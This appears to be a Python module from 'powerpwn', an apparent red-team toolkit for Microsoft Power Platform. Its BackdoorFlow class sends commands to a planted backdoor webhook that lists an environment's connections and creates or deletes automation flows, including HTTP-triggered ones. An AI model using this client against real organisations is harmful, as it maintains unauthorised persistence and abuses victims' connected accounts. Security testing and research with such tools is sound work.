import json
import logging
import os
from typing import Any, Dict, List

import requests
from pydantic import ValidationError

from powerpwn.cli.const import LOGGER_NAME, TOOL_NAME
from powerpwn.powerdoor.create_flow_model import CreateFlowModel

logger = logging.getLogger(LOGGER_NAME)


class BackdoorFlow:
    def __init__(self, webhook: str):
        self.webhook = webhook
        self.session = requests.Session()
        self.session.headers = {"User-Agent": TOOL_NAME}

    def __command(self, action: str, inputs: Dict[str, Any], output_to_stdout: bool = True):
        resp = self.session.post(url=self.webhook, json={"action": action, "inputs": inputs})
        if resp.status_code == 400:
            logger.error(f"Bad request schema. Error: {resp.content}.")
        elif resp.status_code == 500 and "action" in resp.headers:
            logger.error(f"Failed to perform action {resp.headers['action']}. Error: {resp.content}.")
        elif resp.status_code == 200:
            logger.info(f"Action {action} completed successfully.")
            if output_to_stdout:
                logger.info(f"Response: {resp.content}.")
            pass
        else:
            logger.error(f"Unexpected status code {resp.status_code}. Error: {resp.content}.")

        json_content = resp.json()
        return json_content

    def get_connections(self, environment_id: str, output_to_stdout: bool = True):
        # returns: connectionName=['name'], id=['properties']['apiId']
        return self.__command(action="getConnections", inputs={"environment": environment_id}, output_to_stdout=output_to_stdout)

    def create_flow(
        self,
        environment_id: str,
        flow_display_name: str,
        flow_definition: Any,
        flow_state: str,
        connection_references: List[Dict[str, str]],
        is_webhook: bool,
    ):
        # returns: flowId=['flowId']
        return self.__command(
            action="createFlow",
            inputs={
                "environment": environment_id,
                "flowDisplayName": flow_display_name,
                "flowDefinition": flow_definition,
                "flowState": flow_state,
                "connectionReferences": connection_references,
                "isWebhook": is_webhook,
            },
            output_to_stdout=True,
        )

    def create_flow_from_input_file(self, environment_id: str, input_file_path: str):
        if not os.path.exists(input_file_path):
            logger.info("Input file is not found")
            return None

        with open(input_file_path) as f:
            try:
                input_file_content = json.load(f)
                input_file_model = CreateFlowModel.parse_obj(input_file_content)
                is_webhook = input_file_model.flow_definition["triggers"].get("manual", {}).get("kind", "") == "Http"
                return self.create_flow(
                    environment_id,
                    input_file_model.flow_display_name,
                    input_file_model.flow_definition,
                    input_file_model.flow_state,
                    input_file_model.connection_references,
                    is_webhook=is_webhook,
                )
            except json.decoder.JSONDecodeError:
                logger.info("Input file is not a valid json.")
                return None
            except ValidationError:
                logger.info("Input file is not in expected format. ")
                return None

    def delete_flow(self, environment_id: str, flow_id: str):
        # returns:
        return self.__command(action="deleteFlow", inputs={"environment": environment_id, "flowId": flow_id})
